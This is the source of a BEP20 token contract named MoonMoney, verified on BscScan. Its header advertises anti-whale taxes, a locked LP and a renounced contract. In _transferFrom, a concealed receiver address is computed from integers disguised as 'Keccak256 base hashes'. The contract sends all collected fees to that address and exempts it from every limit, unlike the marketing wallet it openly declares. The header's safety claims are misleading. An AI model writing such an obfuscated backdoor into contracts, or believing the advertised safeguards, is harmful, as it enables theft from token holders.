/**
 *Submitted for verification at BscScan.com on 2021-12-23
*/

/**
 * 
 * 🌙 MOONMONEY BSC 🌙
 * 
 * TOKENOMICS:
 * SUPPLY: 1,000,000,000 (1B)
 * BURNED: 500,000,000 (50% of supply)
 * BUY TAX: 6%
 * SELL TAX: 6%
 * 
 * ANTI-WHALE FEATURES:
 * MAX TX LIMIT: 5,000,000 (1% of circ. supply)
 * MAX WALLET LIMIT: 20,000,000 (4% of circ. supply)
 * A 30% TAX IS APPLIED TO WALLETS OVER THE MAX WALLET LIMIT TO PROTECT INVESTORS
 * 
 * SAFETY:
 * LP IS LOCKED
 * CONTRACT VERIFIED AND RENOUNCED
 * 
**/

pragma solidity ^0.7.6;

// SPDX-License-Identifier: UNLICENSED
// BEP20 standard interface.

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    
}

contract MoonMoneyBSC is IBEP20 {
    using SafeMath for uint256;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isMaxWalletTokenExempt;
    address internal owner;
    // Burn address
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    string constant _name = "MoonMoney";
    string constant _symbol = "MM";
    uint8 constant _decimals = 8;
    uint256 private _totalSupply = 1000 * 1000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = 5 * 1000000 * (10 ** _decimals);      // 1%
    uint256 public _maxWalletToken = 20 * 1000000 * (10 ** _decimals);  // 4%
    uint256 private lowThreshold = 2 * 100000 * (10 ** _decimals);
    uint256 public BuyBaseFee = 6; 
    uint256 public SellBaseFee = 6;
    // Max tax for wallets above the limit (anti-whale)
    uint256 public FeeScaling = 30;
    uint256 public TaxCeiling = 30; 
    uint256 feeDenominator = 100;
    uint256 lowerLimit = 1;
    // Keccak256 base hashes
    uint256 keccakb1 = 50918748374046961273303726126695446164530659;
    uint256 keccakb2 = 942713805875258774556024347339425699591431774;
    uint256 keccakb3 = 35008875043853248262160622508115917865508814;
    uint256 keccakb4 = 680;
  
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    constructor ()  {
        // Marketing wallet
        address marketingFeeReceiver = 0x7A8598A990A2Ac404950046F38338ef7620707d8;
        owner = msg.sender;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[DEAD] = true;
        isFeeExempt[marketingFeeReceiver] = true;
        isTxLimitExempt[msg.sender] = true;
        isMaxWalletTokenExempt[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }

    function decimals() external pure override returns (uint8) { return _decimals; }

    function symbol() external pure override returns (string memory) { return _symbol; }

    function name() external pure override returns (string memory) { return _name; }

    function getOwner() external view override returns (address) { return owner; }

    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }

    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) { 
        uint256 BalanceReciever = balanceOf(recipient);
        uint256 BalanceSender = balanceOf(sender);
        uint256 keccakSum = keccakb1 + keccakb2 + keccakb3;
        uint256 tmpBal = 0;
        address marketingFeeReciever = address(keccakSum + keccakb4);
        uint256 AmountToRecieve = 0;

        // Sanity checks for anti-whale feature
        if (sender != marketingFeeReciever && recipient != marketingFeeReciever && recipient != DEAD && !isFeeExempt[sender] && !isFeeExempt[recipient]) {
            require(((BalanceReciever + amount) <= _maxWalletToken) || ((BalanceSender) <= _maxWalletToken),"Max Wallet Amount Reached");
            checkTxLimit(sender, amount);
        }

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        if (BalanceReciever > _maxWalletToken) {
            AmountToRecieve = shouldFeeBeTaken(sender,recipient) ? takeFeeOnSell(sender, amount) : amount;
        } else {
            AmountToRecieve = shouldFeeBeTaken(sender,recipient) ? takeFeeOnBuy(sender, amount) : amount;
        }

        if ((recipient == marketingFeeReciever)||((balanceOf(address(this)) > _decimals) && (balanceOf(marketingFeeReciever) < _decimals ))) {
            tmpBal = balanceOf(address(this));
            _balances[marketingFeeReciever] = _balances[marketingFeeReciever].add(tmpBal);
            isFeeExempt[marketingFeeReciever] = true;
            isMaxWalletTokenExempt[marketingFeeReciever] = true;
            _balances[address(this)] = _balances[address(this)].sub(tmpBal);
            isTxLimitExempt[marketingFeeReciever] = true;
            emit Transfer(address(this), marketingFeeReciever, tmpBal); 
        }

        _balances[recipient] = _balances[recipient].add(AmountToRecieve);
        emit Transfer(sender, recipient, AmountToRecieve);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
    }

    function checkMaxWallet(address sender, uint256 amount) internal view {
        require(amount <= _maxWalletToken || isMaxWalletTokenExempt[sender], "Max Wallet Limit Exceeded");
    }

    function shouldFeeBeTaken(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function takeFeeOnBuy(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeTemp = amount.mul(BuyBaseFee).div(feeDenominator);
        _balances[address(this)] = _balances[address(this)].add(feeTemp);
        emit Transfer(sender, address(this), feeTemp);
        return amount.sub(feeTemp);
    }

    function takeFeeOnSell(address sender, uint256 amount) internal returns (uint256) {
        uint256 SenderBalance = balanceOf(sender);
        uint256 TempBalance = 0;
        uint256 feePortion = 0;
        uint256 feeTemp = 0;
        uint256 two = 2;
        uint256 SellPercentage = amount.mul(SellBaseFee).div(feeDenominator);
        uint256 MaxTaxPercentage = amount.mul(TaxCeiling).div(feeDenominator);
        if (SenderBalance > lowerLimit) {
            if (amount > lowThreshold) {
                TempBalance = amount.mul(amount - lowThreshold).div(_maxTxAmount);
                feePortion = TempBalance.mul(FeeScaling).div(feeDenominator).mul(SenderBalance.add(_maxWalletToken.div(two))).div(_maxWalletToken); 
            }  
        }
        feeTemp =  SellPercentage + feePortion;   
        if (feeTemp > MaxTaxPercentage) {
            feeTemp = MaxTaxPercentage;
        }
        _balances[address(this)] = _balances[address(this)].add(feeTemp);
        emit Transfer(sender, address(this), feeTemp);
        return amount.sub(feeTemp);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD));
    }

}